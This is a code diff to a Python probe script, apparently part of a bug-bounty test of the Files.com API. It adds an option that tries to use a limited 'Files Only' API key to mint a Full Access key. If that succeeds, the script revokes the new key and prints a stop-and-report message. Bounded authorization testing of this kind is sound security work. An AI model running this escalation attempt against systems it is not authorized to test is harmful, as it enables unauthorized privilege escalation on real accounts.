@@ -21,6 +21,10 @@ Usage:
   FILES_BASE_URL=https://example.files.com FILES_API_KEY='...' \
     python3 tools/files_api_permission_probe.py
 
+Optional self-contained escalation check:
+  FILES_BASE_URL=https://example.files.com FILES_API_KEY='...' \
+    python3 tools/files_api_permission_probe.py --test-key-escalation
+
 A 2xx response from an endpoint whose current docs require Site Admin
 privileges is a high-signal authorization-boundary candidate and should be
 stopped and reported rather than explored further.
@@ -78,6 +82,66 @@ TARGETS = (
         "https://developers.files.com/javascript/resources/logging/actions/",
     ),
 )
+
+
+
+
+def test_key_creation_escalation(client: httpx.Client, base: str, out: dict[str, Any]) -> int:
+    """Test whether a Files Only key can mint a Full Access key for the current user."""
+    url = base + "/api/rest/v1/api_keys.json"
+    payload = {
+        "name": "BUGBOUNTY-FilesOnly-Escalation-Test",
+        "permission_set": "full",
+        "user_id": 0,
+        "expires_at": "2030-01-01T00:00:00Z",
+    }
+    response = client.post(url, json=payload)
+    item = {
+        "name": "api_key_creation_escalation",
+        "url": url,
+        "method": "POST",
+        "status": response.status_code,
+        "content_type": response.headers.get("content-type", ""),
+        "response_length": len(response.content),
+        "documentation": "https://developers.files.com/java/resources/developers/api-keys/",
+    }
+    out["requests"].append(item)
+    if not (200 <= response.status_code < 300):
+        return 0
+
+    try:
+        body = response.json()
+    except ValueError:
+        body = {}
+
+    data = body.get("data", body) if isinstance(body, dict) else {}
+    new_key = data.get("key") if isinstance(data, dict) else None
+    new_id = data.get("id") if isinstance(data, dict) else None
+    new_permission_set = data.get("permission_set") if isinstance(data, dict) else None
+
+    item["created_key_id"] = new_id
+    item["created_permission_set"] = new_permission_set
+    out["candidate"] = item
+
+    if new_key:
+        time.sleep(1.05)
+        revoke = client.delete(
+            base + "/api/rest/v1/api_keys/current.json",
+            headers={
+                "X-FilesAPI-Key": str(new_key),
+                "Accept": "application/json",
+                "User-Agent": "H1-Bounty-Agent/FilesCom-API-Boundary-Probe",
+            },
+        )
+        item["cleanup_status"] = revoke.status_code
+
+    print(json.dumps(out, indent=2))
+    print(
+        "\nSTOP: Files Only key successfully created a Full Access API key. "
+        "This is a potential authorization-boundary violation.",
+        file=sys.stderr,
+    )
+    return 10
 
 
 def main() -> int:
@@ -149,6 +213,11 @@ def main() -> int:
                         "documentation": target.documentation,
                     }
                 )
+
+    if "--test-key-escalation" in sys.argv:
+        if out["requests"]:
+            time.sleep(1.05)
+        return test_key_creation_escalation(client, base, out)
 
     print(json.dumps(out, indent=2))
     return 0
